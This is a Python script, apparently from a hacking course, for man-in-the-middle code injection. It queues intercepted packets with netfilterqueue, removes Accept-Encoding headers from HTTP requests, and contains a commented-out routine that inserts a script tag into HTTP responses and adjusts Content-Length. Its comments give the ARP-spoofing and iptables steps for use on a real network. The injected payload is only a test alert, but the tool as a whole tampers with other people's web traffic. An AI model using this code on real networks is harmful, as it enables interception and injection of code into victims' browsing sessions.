#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http #you need to pip install scapy_http 
import re

#if tested on a real network:
#   -launch arp spoofer
#   -set iptables as follow: iptables -i forward -j nfqueue --queue-num 0
#   -lauch this script
#
#once you are done, flush the iptables: iptables --flush

#set the iptables as follow to test on local machine test on local machine
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(http.HTTPRequest) \
            and scapy_packet[scapy.TCP].dport == 80: 

        print("[+] Request")
        headers = re.sub("Accept-Encoding.*?\\r\\n","", scapy_packet[http.HTTPRequest].Headers)
        scapy_packet[http.HTTPRequest].Headers = headers
        scapy_packet.show()

        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.TCP].chksum
        packet.set_payload(str(scapy_packet)) 



    if scapy_packet.haslayer(http.HTTPResponse) \
            and scapy_packet[scapy.TCP].sport == 80 \
            and scapy_packet.haslayer(scapy.Raw): 

        scapy_packet.show()
        print("[+] Response!")
        injection_code = "<script>alert('test')</script>"
        headers = ""
        load = ""

#        #Modifying the content length of the load
#        if scapy_packet[http.HTTPResponse].Headers:
#            headers = scapy_packet[http.HTTPResponse].Headers 
#            content_length_search = re.search("(?:Content-Length:\s)(\d*)",headers)
#            if content_length_search:
#                content_length = content_length_search.group(1)
#                new_content_length = int(content_length) + len(injection_code)
#                headers = headers.replace(content_length, str(new_content_length))

#        load = scapy_packet[scapy.Raw].load
#        load = load.replace("</body>",injection_code + "</body>")

#        if headers != ""  and headers != scapy_packet[http.HTTPResponse].Headers:
#            scapy_packet[http.HTTPResponse].Headers = headers
#            del scapy_packet[scapy.IP].len
#            del scapy_packet[scapy.IP].chksum
#            del scapy_packet[scapy.TCP].chksum
#
#
#        if load != scapy_packet[scapy.Raw].load:
#           print("[!] Load is being modified!")
#           #print(scapy_packet[http.HTTPResponse].load)
#           #print(load)
#           new_packet = set_load(scapy_packet, load)
#           packet.set_payload(str(new_packet)) 
#

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

